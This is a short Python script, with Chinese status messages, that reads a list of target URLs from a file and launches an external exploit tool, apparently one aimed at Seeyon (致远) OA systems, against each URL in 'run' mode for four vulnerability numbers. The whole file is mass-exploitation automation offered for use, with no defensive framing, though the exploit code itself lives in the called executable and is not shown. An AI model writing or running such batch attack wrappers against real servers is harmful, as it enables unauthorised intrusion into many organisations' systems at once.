# coding=utf-8
import os
import subprocess

numlist = (2, 3, 4, 6)

file = open('url.txt', 'r+')
print("[+]  continue~")
# os.system(r'cd D:\Coding\Hacker\vuln\seeyon-exploit-main\致远OA综合漏洞利用工具')
x = 0
while 1:
    line = file.readline()
    # str(line)
    if not line:
        print("全部检测完成!")
        break
    x = x + 1
    print("正在测试第{}个url".format(x))
    for i in range(0, 4):
        num = numlist[i]
        payload = ("D:\Coding\seeyoner.exe -u {line} -vn {num} -m run".format(line=line, num=num))
        # -u {line} -vn {num} -m run".format(line=line, num=num)
        # print(payload)
        # time.sleep(2)
        # os.system(payload)
        # print(payload)
        subprocess.Popen([r'D:\Coding\seeyoner.exe','-u',line,'-vn',str(num),'-m','run'])
file.close()
